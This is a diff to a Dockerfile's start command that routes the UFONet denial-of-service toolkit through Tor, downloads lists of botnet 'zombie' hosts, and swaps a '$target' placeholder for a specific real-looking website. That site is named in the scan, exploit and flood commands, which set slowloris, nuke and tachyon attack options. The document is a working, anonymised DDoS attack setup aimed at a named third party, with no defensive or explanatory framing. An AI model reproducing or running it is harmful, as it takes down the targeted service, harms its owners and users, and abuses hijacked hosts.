@@ -48,7 +48,7 @@ CMD sudo service tor start && \
     # sudo service privoxy start && \ 
     python3 ufonet --check-tor --proxy="http://127.0.0.1:8118" && \ 
     python3 ufonet --download-zombies --force-yes &&  \ 
-    python3 ufonet -i '$target' --force-yes && \ 
-    python3 ufonet -x '$target' --force-yes && \ 
+    python3 ufonet -i 'https://lasgsafetyreg.com/' --force-yes && \ 
+    python3 ufonet -x 'https://lasgsafetyreg.com/' --force-yes && \ 
     python3 ufonet --download-github --force-yes && \ 
-    python3 ufonet  --threads 20  -a '$target' --force-yes -r 10 --loris 500 --db "search.php?q=" --nuke 10000 --tachyon 1000 
+    python3 ufonet  --threads 20  -a 'https://lasgsafetyreg.com/' --force-yes -r 10 --loris 500 --db "search.php?q=" --nuke 10000 --tachyon 1000 
